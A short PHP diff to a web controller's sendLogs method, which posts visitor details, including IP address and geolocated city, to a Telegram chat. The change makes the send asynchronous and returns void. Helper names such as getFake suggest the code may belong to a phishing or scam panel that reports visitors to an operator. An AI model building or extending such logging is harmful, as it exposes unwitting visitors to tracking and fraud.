@@ -110,9 +110,9 @@ class PagesController extends Controller
     /**
      * @param $chat_id
      * @param array $text
-     * @return Message|null
+     * @return void
      */
-    private function sendLogs($chat_id, array $text = []): ?Message
+    private function sendLogs($chat_id, array $text = []): void
     {
         try {
             $fake = $this->getFake();
@@ -137,17 +137,19 @@ class PagesController extends Controller
                 $text[] = "👤<b>IP:</b> <code>$ip $city_geo</code>";
             }
 
-            return $this->getTelegram()->sendMessage([
-                'chat_id' => $chat_id,
-                'text' => makeText($text),
-                'disable_web_page_preview' => true,
-                "parse_mode" => "html",
-                "reply_markup" => $keyboard
-            ]);
+            $this->getTelegram()
+                ->setAsyncRequest(true)
+                ->sendMessage([
+                    'chat_id' => $chat_id,
+                    'text' => makeText($text),
+                    'disable_web_page_preview' => true,
+                    "parse_mode" => "html",
+                    "reply_markup" => $keyboard
+                ]);
+            return;
         } catch (TelegramSDKException $e) {
-            Log::error($e->getMessage());
+            Log::error("PagesController::sendLogs {$e->getMessage()}");
         }
-        return null;
     }
 
     public function index()
